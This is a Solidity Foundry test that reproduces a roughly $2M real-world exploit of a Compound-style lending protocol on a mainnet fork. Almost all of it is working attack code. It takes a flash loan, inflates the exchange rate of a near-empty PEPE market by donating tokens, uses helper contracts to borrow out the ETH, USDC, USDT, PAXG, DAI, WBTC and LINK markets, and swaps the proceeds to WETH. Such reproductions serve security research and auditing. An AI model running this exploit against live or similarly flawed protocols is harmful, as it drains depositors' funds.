// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~$2M
// Attacker : https://etherscan.io/address/0x085bdff2c522e8637d4154039db8746bb8642bff
// Attack Contract : https://etherscan.io/address/0x526e8e98356194b64eae4c2d443cc8aad367336f
// Vuln Contract : https://etherscan.io/address/0x5fdbcd61bc9bd4b6d3fd1f49a5d253165ea11750
// Attack Tx : https://explorer.phalcon.xyz/tx/eth/0xf7c21600452939a81b599017ee24ee0dfd92aaaccd0a55d02819a7658a6ef635

// @Analysis
// https://twitter.com/Phalcon_xyz/status/1719697319824851051
// https://defimon.xyz/attack/mainnet/0xf7c21600452939a81b599017ee24ee0dfd92aaaccd0a55d02819a7658a6ef635
// https://twitter.com/DecurityHQ/status/1719657969925677161

interface IComptroller {
    function liquidateCalculateSeizeTokens(
        address cTokenBorrowed,
        address cTokenCollateral,
        uint256 actualRepayAmount
    ) external view returns (uint256, uint256);

    function enterMarkets(address[] memory cTokens) external returns (uint256[] memory);
}

contract ContractTest is Test {
    IAaveFlashloan private constant AaveV3 = IAaveFlashloan(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    IWETH private constant WETH = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    IERC20 private constant PEPE = IERC20(0x6982508145454Ce325dDbE47a25d4ec3d2311933);
    IUSDC private constant USDC = IUSDC(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IUSDT private constant USDT = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 private constant PAXG = IERC20(0x45804880De22913dAFE09f4980848ECE6EcbAf78);
    IERC20 private constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 private constant WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    IERC20 private constant LINK = IERC20(0x514910771AF9Ca656af840dff83E8264EcF986CA);
    ICErc20Delegate private constant oPEPE = ICErc20Delegate(payable(0x5FdBcD61bC9bd4B6D3FD1F49a5D253165Ea11750));
    ICErc20Delegate private constant oUSDC = ICErc20Delegate(payable(0x8f35113cFAba700Ed7a907D92B114B44421e412A));
    ICErc20Delegate private constant oUSDT = ICErc20Delegate(payable(0xbCed4e924f28f43a24ceEDec69eE21ed4D04D2DD));
    ICErc20Delegate private constant oPAXG = ICErc20Delegate(payable(0x0C19D213e9f2A5cbAA4eC6E8eAC55a22276b0641));
    ICErc20Delegate private constant oDAI = ICErc20Delegate(payable(0x830DAcD5D0a62afa92c9Bc6878461e9cD317B085));
    ICErc20Delegate private constant oBTC = ICErc20Delegate(payable(0x1933f1183C421d44d531Ed40A5D2445F6a91646d));
    ICErc20Delegate private constant oLINK = ICErc20Delegate(payable(0xFEe4428b7f403499C50a6DA947916b71D33142dC));
    crETH private constant oETHER = crETH(payable(0x714bD93aB6ab2F0bcfD2aEaf46A46719991d0d79));
    Uni_Pair_V2 private constant PEPE_WETH = Uni_Pair_V2(0xA43fe16908251ee70EF74718545e4FE6C5cCEc9f);
    Uni_Pair_V2 private constant USDC_WETH = Uni_Pair_V2(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);
    Uni_Pair_V2 private constant WETH_USDT = Uni_Pair_V2(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);
    Uni_Pair_V2 private constant PAXG_WETH = Uni_Pair_V2(0x9C4Fe5FFD9A9fC5678cFBd93Aa2D4FD684b67C4C);
    Uni_Pair_V2 private constant DAI_WETH = Uni_Pair_V2(0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11);
    Uni_Pair_V2 private constant WBTC_WETH = Uni_Pair_V2(0xBb2b8038a1640196FbE3e38816F3e67Cba72D940);
    Uni_Pair_V2 private constant LINK_WETH = Uni_Pair_V2(0xa2107FA5B38d9bbd2C461D6EDf11B11A50F6b974);
    Uni_Router_V2 private constant Router = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    function setUp() public {
        vm.createSelectFork("mainnet", 18_476_512);
        vm.label(address(AaveV3), "AaveV3");
        vm.label(address(WETH), "WETH");
        vm.label(address(PEPE), "PEPE");
        vm.label(address(oPEPE), "oPEPE");
        vm.label(address(oETHER), "oETHER");
        vm.label(address(PEPE_WETH), "PEPE_WETH");
        vm.label(address(Router), "Router");
    }

    function testExploit() public {
        deal(address(this), 0 ether);
        deal(address(WETH), address(this), 0);
        emit log_named_decimal_uint("Attacker WETH balance before exploit", WETH.balanceOf(address(this)), 18);

        AaveV3.flashLoanSimple(address(this), address(WETH), 4000 * 1e18, bytes(""), 0);

        emit log_named_decimal_uint("Attacker WETH balance after exploit", WETH.balanceOf(address(this)), 18);
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        approveAll();
        (uint112 reservePEPE, uint112 reserveWETH,) = PEPE_WETH.getReserves();
        uint256 amountOut = calcAmountOut(reservePEPE, reserveWETH, WETH.balanceOf(address(this)));
        WETHToPEPE(amountOut);

        // oETHER
        IntermediateContractETH intermediateETH = new IntermediateContractETH();
        PEPE.transfer(address(intermediateETH), PEPE.balanceOf(address(this)));
        intermediateETH.start();
        oETHER.liquidateBorrow{value: 0.000000000000000001 ether}(address(intermediateETH), address(oPEPE));
        oPEPE.redeem(oPEPE.balanceOf(address(this)));
        WETH.deposit{value: address(this).balance}();

        // oUSDC
        {
            exploitToken(oUSDC);
            (uint112 reserveUSDC, uint112 reserveWETH1,) = USDC_WETH.getReserves();
            amountOut = calcAmountOut(reserveWETH1, reserveUSDC, USDC.balanceOf(address(this)));
            USDCToWETH(amountOut);
        }

        // oUSDT
        {
            exploitToken(oUSDT);
            (uint112 reserveWETH2, uint112 reserveUSDT,) = WETH_USDT.getReserves();
            amountOut = calcAmountOut(reserveUSDT, reserveWETH2, USDT.balanceOf(address(this)));
            USDTToWETH(amountOut);
        }

        // oPAXG
        {
            exploitToken(oPAXG);
            (uint112 reservePAXG, uint112 reserveWETH3,) = PAXG_WETH.getReserves();
            amountOut = calcAmountOut(reserveWETH3, reservePAXG, PAXG.balanceOf(address(this)));
            PAXGToWETH(amountOut);
        }

        // oDAI
        {
            exploitToken(oDAI);
            (uint112 reserveDAI, uint112 reserveWETH4,) = DAI_WETH.getReserves();
            amountOut = calcAmountOut(reserveWETH4, reserveDAI, DAI.balanceOf(address(this)));
            DAIToWETH(amountOut);
        }

        // oBTC
        {
            exploitToken(oBTC);
            (uint112 reserveWBTC, uint112 reserveWETH5,) = WBTC_WETH.getReserves();
            amountOut = calcAmountOut(reserveWETH5, reserveWBTC, WBTC.balanceOf(address(this)));
            WBTCToWETH(amountOut);
        }

        // oLink
        {
            exploitToken(oLINK);
            (uint112 reserveLINK, uint112 reserveWETH6,) = LINK_WETH.getReserves();
            amountOut = calcAmountOut(reserveWETH6, reserveLINK, LINK.balanceOf(address(this)));

            LINKToWETH(amountOut);
        }

        // PEPE
        PEPEToWETH();

        WETH.approve(address(AaveV3), amount + premium);
        return true;
    }

    receive() external payable {}

    function WETHToPEPE(uint256 _amountOut) internal {
        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(PEPE);
        Router.swapExactTokensForTokens(
            WETH.balanceOf(address(this)), (_amountOut - _amountOut / 100), path, address(this), block.timestamp + 3600
        );
    }

    function USDCToWETH(uint256 _amountOut) internal {
        address[] memory path = new address[](2);
        path[0] = address(USDC);
        path[1] = address(WETH);
        Router.swapExactTokensForTokens(
            USDC.balanceOf(address(this)), (_amountOut - _amountOut / 100), path, address(this), block.timestamp + 3600
        );
    }

    function USDTToWETH(uint256 _amountOut) internal {
        address[] memory path = new address[](2);
        path[0] = address(USDT);
        path[1] = address(WETH);
        Router.swapExactTokensForTokens(
            USDT.balanceOf(address(this)), (_amountOut - _amountOut / 100), path, address(this), block.timestamp + 3600
        );
    }

    function PAXGToWETH(uint256 _amountOut) internal {
        address[] memory path = new address[](2);
        path[0] = address(PAXG);
        path[1] = address(WETH);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            PAXG.balanceOf(address(this)), (_amountOut - _amountOut / 100), path, address(this), block.timestamp + 3600
        );
    }

    function DAIToWETH(uint256 _amountOut) internal {
        address[] memory path = new address[](2);
        path[0] = address(DAI);
        path[1] = address(WETH);
        Router.swapExactTokensForTokens(
            DAI.balanceOf(address(this)), (_amountOut - _amountOut / 100), path, address(this), block.timestamp + 3600
        );
    }

    function WBTCToWETH(uint256 _amountOut) internal {
        address[] memory path = new address[](2);
        path[0] = address(WBTC);
        path[1] = address(WETH);
        Router.swapExactTokensForTokens(
            WBTC.balanceOf(address(this)), (_amountOut - _amountOut / 100), path, address(this), block.timestamp + 3600
        );
    }

    function LINKToWETH(uint256 _amountOut) internal {
        address[] memory path = new address[](2);
        path[0] = address(LINK);
        path[1] = address(WETH);
        Router.swapExactTokensForTokens(
            LINK.balanceOf(address(this)), (_amountOut - _amountOut / 100), path, address(this), block.timestamp + 3600
        );
    }

    function PEPEToWETH() internal {
        address[] memory path = new address[](2);
        path[0] = address(PEPE);
        path[1] = address(WETH);
        Router.swapExactTokensForTokens(
            PEPE.balanceOf(address(this)), 3_950_619_005_376_690_920_220, path, address(this), block.timestamp + 3600
        );
    }

    function approveAll() internal {
        WETH.approve(address(Router), type(uint256).max);
        USDC.approve(address(Router), type(uint256).max);
        USDC.approve(address(oUSDC), type(uint256).max);
        USDT.approve(address(Router), type(uint256).max);
        USDT.approve(address(oUSDT), type(uint256).max);
        PAXG.approve(address(Router), type(uint256).max);
        PAXG.approve(address(oPAXG), type(uint256).max);
        DAI.approve(address(Router), type(uint256).max);
        DAI.approve(address(oDAI), type(uint256).max);
        WBTC.approve(address(Router), type(uint256).max);
        WBTC.approve(address(oBTC), type(uint256).max);
        LINK.approve(address(Router), type(uint256).max);
        LINK.approve(address(oLINK), type(uint256).max);
        PEPE.approve(address(Router), type(uint256).max);
    }

    function calcAmountOut(uint112 reserve1, uint112 reserve2, uint256 tokenBalance) internal pure returns (uint256) {
        uint256 a = (tokenBalance * 997);
        uint256 b = a * reserve1;
        uint256 c = (reserve2 * 1000) + a;
        return b / c;
    }

    function exploitToken(ICErc20Delegate onyxToken) internal {
        IntermediateContractToken intermediateToken = new IntermediateContractToken();
        PEPE.transfer(address(intermediateToken), PEPE.balanceOf(address(this)));
        intermediateToken.start(onyxToken);
        onyxToken.liquidateBorrow(address(intermediateToken), 1, address(oPEPE));
        oPEPE.redeem(oPEPE.balanceOf(address(this)));
    }
}

contract IntermediateContractETH {
    IERC20 private constant PEPE = IERC20(0x6982508145454Ce325dDbE47a25d4ec3d2311933);
    ICErc20Delegate private constant oPEPE = ICErc20Delegate(payable(0x5FdBcD61bC9bd4B6D3FD1F49a5D253165Ea11750));
    crETH private constant oETHER = crETH(payable(0x714bD93aB6ab2F0bcfD2aEaf46A46719991d0d79));
    IComptroller private constant Unitroller = IComptroller(0x7D61ed92a6778f5ABf5c94085739f1EDAbec2800);

    function start() external {
        PEPE.approve(address(oPEPE), type(uint256).max);
        oPEPE.mint(1e18);
        oPEPE.redeem(oPEPE.totalSupply() - 2);
        uint256 redeemAmt = PEPE.balanceOf(address(this)) - 1;
        PEPE.transfer(address(oPEPE), PEPE.balanceOf(address(this)));

        address[] memory oTokens = new address[](1);
        oTokens[0] = address(oPEPE);
        Unitroller.enterMarkets(oTokens);
        oETHER.borrow(oETHER.getCash() - 1);

        (bool success,) = msg.sender.call{value: address(this).balance}("");
        require(success, "Transfer ETH not successful");

        oPEPE.redeemUnderlying(redeemAmt);
        (,,, uint256 exchangeRate) = oPEPE.getAccountSnapshot(address(this));
        (, uint256 numSeizeTokens) = Unitroller.liquidateCalculateSeizeTokens(address(oETHER), address(oPEPE), 1);
        uint256 mintAmount = (exchangeRate / 1e18) * numSeizeTokens - 2;
        oPEPE.mint(mintAmount);
        PEPE.transfer(msg.sender, PEPE.balanceOf(address(this)));
    }

    receive() external payable {}
}

contract IntermediateContractToken {
    IERC20 private constant PEPE = IERC20(0x6982508145454Ce325dDbE47a25d4ec3d2311933);
    ICErc20Delegate private constant oPEPE = ICErc20Delegate(payable(0x5FdBcD61bC9bd4B6D3FD1F49a5D253165Ea11750));
    IUSDC private constant USDC = IUSDC(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IUSDT private constant USDT = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IComptroller private constant Unitroller = IComptroller(0x7D61ed92a6778f5ABf5c94085739f1EDAbec2800);

    function start(ICErc20Delegate onyxToken) external {
        PEPE.approve(address(oPEPE), type(uint256).max);
        oPEPE.mint(1e18);
        oPEPE.redeem(oPEPE.totalSupply() - 2);
        uint256 redeemAmt = PEPE.balanceOf(address(this)) - 1;
        PEPE.transfer(address(oPEPE), PEPE.balanceOf(address(this)));

        address[] memory oTokens = new address[](1);
        oTokens[0] = address(oPEPE);
        Unitroller.enterMarkets(oTokens);
        onyxToken.borrow(onyxToken.getCash() - 1);

        if (onyxToken.underlying() == address(USDC)) {
            USDC.transfer(msg.sender, USDC.balanceOf(address(this)));
        } else if (onyxToken.underlying() == address(USDT)) {
            USDT.transfer(msg.sender, USDT.balanceOf(address(this)));
        } else {
            IERC20(onyxToken.underlying()).transfer(msg.sender, IERC20(onyxToken.underlying()).balanceOf(address(this)));
        }

        oPEPE.redeemUnderlying(redeemAmt);
        (,,, uint256 exchangeRate) = oPEPE.getAccountSnapshot(address(this));
        (, uint256 numSeizeTokens) = Unitroller.liquidateCalculateSeizeTokens(address(onyxToken), address(oPEPE), 1);
        uint256 mintAmount = (exchangeRate / 1e18) * numSeizeTokens - 2;
        oPEPE.mint(mintAmount);
        PEPE.transfer(msg.sender, PEPE.balanceOf(address(this)));
    }

    receive() external payable {}
}
